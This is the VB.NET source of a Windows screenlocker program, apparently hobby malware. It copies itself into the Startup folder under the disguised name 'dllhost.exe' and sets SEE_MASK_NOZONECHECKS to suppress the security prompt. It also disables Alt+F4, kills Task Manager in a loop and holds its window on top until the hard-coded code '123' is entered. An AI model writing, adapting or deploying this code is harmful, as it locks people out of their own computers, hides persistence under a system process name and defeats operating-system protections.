Public Class Form1
    Private Sub ElegantThemeButton1_Click(sender As Object, e As EventArgs) Handles ElegantThemeButton1.Click
        ''The default password (123)
        If ElegantThemeTextBox1.Text = ("123") Then
            On Error Resume Next

            Timer2.Enabled = False

            ''Write our placeholder to make sure it never starts up again.
            ''TODO: Self-delete instead of writing a placeholder.
            Dim file As System.IO.StreamWriter
            file = My.Computer.FileSystem.OpenTextFileWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\block.dat", True)
            file.WriteLine("001")
            file.Close()

            Application.Exit()

        Else
            ElegantThemeButton1.Enabled = False
            ElegantThemeButton2.Enabled = False
            ElegantThemeButton3.Enabled = False
            ElegantThemeButton4.Enabled = False
            ElegantThemeButton5.Enabled = False
            ElegantThemeButton6.Enabled = False
            ElegantThemeButton7.Enabled = False
            ElegantThemeButton8.Enabled = False
            ElegantThemeButton9.Enabled = False
            ElegantThemeButton10.Enabled = False
            ElegantThemeButton11.Enabled = False

            ''Removing the false password.
            ElegantThemeTextBox1.Text = ""
            ''Buzzer sound
            My.Computer.Audio.Play(My.Resources.buzzer, AudioPlayMode.Background)
            ''Shaking animation to inform user they are incorrect.
            Dim a As Integer

            While a < 10
                Panel1.Location = New Point(Panel1.Location.X + 10, Panel1.Location.Y)
                System.Threading.Thread.Sleep(50)
                Panel1.Location = New Point(Panel1.Location.X - 10, Panel1.Location.Y)
                System.Threading.Thread.Sleep(50)
                a += 1
            End While

            ElegantThemeButton1.Enabled = True
            ElegantThemeButton2.Enabled = True
            ElegantThemeButton3.Enabled = True
            ElegantThemeButton4.Enabled = True
            ElegantThemeButton5.Enabled = True
            ElegantThemeButton6.Enabled = True
            ElegantThemeButton7.Enabled = True
            ElegantThemeButton8.Enabled = True
            ElegantThemeButton9.Enabled = True
            ElegantThemeButton10.Enabled = True
            ElegantThemeButton11.Enabled = True
        End If
    End Sub


    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        ''Debug mode for testing screenlocker
#If DEBUG Then
        Timer2.Enabled = False
        Timer3.Enabled = False
        Dim x As DialogResult
        If System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\block.dat") = True Then
            x = MessageBox.Show("Placeholder found, want to remove it to test out the screenlocker?",
                        "Attention!", MessageBoxButtons.YesNo)

            If x = DialogResult.Yes Then
                System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\block.dat")

            End If
            Timer2.Enabled = True
            Timer3.Enabled = True
            ElegantThemeButton13.Visible = True

        End If
#Else

#End If

        'Prevent "do you want to run this file" warning on startup
        Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User)

        If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\dllhost.exe") Then
            'Blank
        Else
            IO.File.Copy(Application.ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\dllhost.exe")
        End If

        ''Check if placeholder exists, if it does then just exit.
        If IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\block.dat") Then
            Application.Exit()
        Else
            Me.Opacity = 100
        End If
    End Sub

    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        'Prevent alt + f4 on the form
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        'Kill task manager in a loop
        Dim process As Process
        For Each process In Process.GetProcessesByName("taskmgr")
            Try
                process.Kill()
            Catch ex As Exception
            End Try
        Next
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        'Make form stay on top
        Me.Activate()
        Me.Focus()
    End Sub

    ''Input stuff
    Private Sub ElegantThemeButton11_Click(sender As Object, e As EventArgs) Handles ElegantThemeButton11.Click
        ElegantThemeTextBox1.Text = ""
    End Sub

    Private Sub ElegantThemeButton2_Click(sender As Object, e As EventArgs) Handles ElegantThemeButton2.Click
        ElegantThemeTextBox1.Text = ElegantThemeTextBox1.Text & "1"
    End Sub

    Private Sub ElegantThemeButton3_Click(sender As Object, e As EventArgs) Handles ElegantThemeButton3.Click
        ElegantThemeTextBox1.Text = ElegantThemeTextBox1.Text & "2"
    End Sub

    Private Sub ElegantThemeButton4_Click(sender As Object, e As EventArgs) Handles ElegantThemeButton4.Click
        ElegantThemeTextBox1.Text = ElegantThemeTextBox1.Text & "3"
    End Sub

    Private Sub ElegantThemeButton5_Click(sender As Object, e As EventArgs) Handles ElegantThemeButton5.Click
        ElegantThemeTextBox1.Text = ElegantThemeTextBox1.Text & "4"
    End Sub

    Private Sub ElegantThemeButton6_Click(sender As Object, e As EventArgs) Handles ElegantThemeButton6.Click
        ElegantThemeTextBox1.Text = ElegantThemeTextBox1.Text & "5"
    End Sub

    Private Sub ElegantThemeButton7_Click(sender As Object, e As EventArgs) Handles ElegantThemeButton7.Click
        ElegantThemeTextBox1.Text = ElegantThemeTextBox1.Text & "6"
    End Sub

    Private Sub ElegantThemeButton8_Click(sender As Object, e As EventArgs) Handles ElegantThemeButton8.Click
        ElegantThemeTextBox1.Text = ElegantThemeTextBox1.Text & "7"
    End Sub

    Private Sub ElegantThemeButton9_Click(sender As Object, e As EventArgs) Handles ElegantThemeButton9.Click
        ElegantThemeTextBox1.Text = ElegantThemeTextBox1.Text & "8"
    End Sub

    Private Sub ElegantThemeButton10_Click(sender As Object, e As EventArgs) Handles ElegantThemeButton10.Click
        ElegantThemeTextBox1.Text = ElegantThemeTextBox1.Text & "9"
    End Sub

    Private Sub ElegantThemeButton12_Click(sender As Object, e As EventArgs) Handles ElegantThemeButton12.Click
        ElegantThemeTextBox1.Text = ElegantThemeTextBox1.Text & "0"
    End Sub

    Private Sub ElegantThemeButton13_Click(sender As Object, e As EventArgs) Handles ElegantThemeButton13.Click
        ''Exit button for debug mode.
        Application.Exit()
    End Sub
End Class
